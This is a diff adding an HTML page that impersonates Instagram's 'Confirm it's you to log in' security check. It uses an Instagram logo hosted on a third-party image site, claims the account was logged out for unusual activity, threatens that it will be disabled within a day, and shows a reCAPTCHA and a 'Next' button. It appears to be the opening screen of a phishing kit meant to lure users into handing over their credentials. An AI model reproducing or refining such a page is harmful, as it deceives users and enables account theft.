@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Medium:wght@500&family=Vazir+Matn:wght@700&family=Heebo:wght@400&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: white;
+            color: black;
+            font-family: 'Roboto', sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+      
+        h1 {
+            font-size: 1.5em;
+            margin-top: -580px; /* Adjust the margin-top as needed */
+        }
+   
+        p {
+            width: 80%;
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+        }
+        
+        .centered-paragraph {
+            text-align: center;
+            font-size: 16px;
+           
+        } 
+     
+        .paragraph {
+            margin: 1px 0; /* Add margin between paragraphs as needed */
+            width: 95%;
+            font-size: 16px;
+            text-align: center;
+        }
+       
+       .paragraph0 {
+           margin: 1px 0; /* Add margin between paragraphs as needed */
+            width: 95%;
+            font-size: 16px;
+            text-align: center;
+       }
+
+
+        #special-paragraph1 {
+            font-size: 13.2px;
+            color: grey;
+            position: absolute;
+            bottom: 470px; /* Adjust this value to move it down */
+        }
+        
+        #special-paragraph2 {
+            font-size: 13.2px;
+            color: grey;
+            position: absolute;
+            bottom: 380px; /* Adjust this value to move it down */
+        }
+        
+        .paragraph1 {
+            font-size: 13px;
+            color: grey;
+            position: absolute;
+            bottom: 530px; /* Adjust this value to move it down */
+        }
+
+        .button {
+            width: 94%;
+            max-width: 500px;
+            margin-top: 370px; /* Adjust margin as needed */
+            padding: 10px 20px; /* Increase or decrease padding as needed */
+            background-color: #0095f6;
+            color: white;
+            position: absolute;
+            font-size: 17px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            opacity: 1;
+            pointer-events: none;
+        }
+
+        /* Add your styles here */
+        .navbar {
+            position: fixed; /* Fix the navbar at the top */
+            top: 0; /* Position it at the top */
+            width: 100%;
+            background-color: #fff;
+            overflow: auto;
+            border-bottom: 1px solid #ddd; /* Change line color to grey */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align the logo at the top */
+            padding: 5px 0; /* Decrease the height of the navigation bar */
+        }
+
+        .navbar img {
+            height: 30px; /* Adjust the height of the logo */
+        }
+     
+        .g-recaptcha {
+        transform: translateX(-50%);
+        transform: scale(1.14); /* Adjust the scale factor as needed */
+        transform-origin: 3 0;
+            
+    }   
+   
+   
+   
+   
+   
+   
+   
+   
+     @media only screen and (max-width: 400px) {
+         h1 {
+            font-size: 1.5em;
+            margin-top: -500px; /* Adjust the margin-top as needed */
+        }
+     
+        .centered-paragraph {
+            text-align: center;
+            font-size: 15px;
+            
+        } 
+     
+        .paragraph {
+            margin: 1px 0; /* Add margin between paragraphs as needed */
+            width: 95%;
+            font-size: 15px;
+            text-align: center;
+        }
+       
+       
+        #special-paragraph1 {
+            font-size: 13px;
+            color: grey;
+            position: absolute;
+            bottom: 327px; /* Adjust this value to move it down */
+        }
+        
+        #special-paragraph2 {
+            font-size: 12.7px;
+            color: grey;
+            position: absolute;
+            bottom: 225px; /* Adjust this value to move it down */
+        }
+        
+        .paragraph1 {
+            font-size: 12px;
+            color: grey;
+            position: absolute;
+            bottom: 400px; /* Adjust this value to move it down */
+        }
+
+        .paragraph0 {
+            margin: 1px 0; /* Add margin between paragraphs as needed */
+            width: 95%;
+            font-size: 15px;
+            text-align: center;
+          
+        }
+        .button {
+            width: 94%;
+            max-width: 500px;
+            margin-top: 380px; /* Adjust margin as needed */
+            padding: 8px 20px; /* Increase or decrease padding as needed */
+            background-color: #0095f6;
+            color: white;
+            position: absolute;
+            font-size: 15px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            opacity: 1;
+            pointer-events: none;
+        }
+     }
+    </style>
+</head>
+<body>
+    <!-- Add a navigation bar with the new Instagram logo -->
+    <div class="navbar">
+        <img src="https://imageupload.io/ib/CmbKwVLELejESS7_1695760434.png" alt="Instagram Logo">
+    </div>
+    
+    <h1>Confirm it's you to log in</h1>
+
+    <p class="paragraph">We noticed unusual activity from your account, so</p>
+    <p class="centered-paragraph">we've logged you out.</p>
+    <p style="margin: 8px 0;"></p>
+    <p class="paragraph0">Follow the next steps within 1 day so we can try to<br>get you back into your account before it's disabled.</p>
+    <div class="g-recaptcha" data-sitekey="6LdaNzwpAAAAAF4tZJOW7VP8IFnfU8vefhWt9_VC"></div>
+    <!-- Add the provided text -->
+    <p class="paragraph1">This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.</p>
+    <p style="margin: 5px 0;"></p>
+    <p id="special-paragraph1">We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.</p>
+    <p style="margin: 5px 0;"></p>
+    <p id="special-paragraph2">reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+    <button class="button">Next</button>
+</body>
+</html>
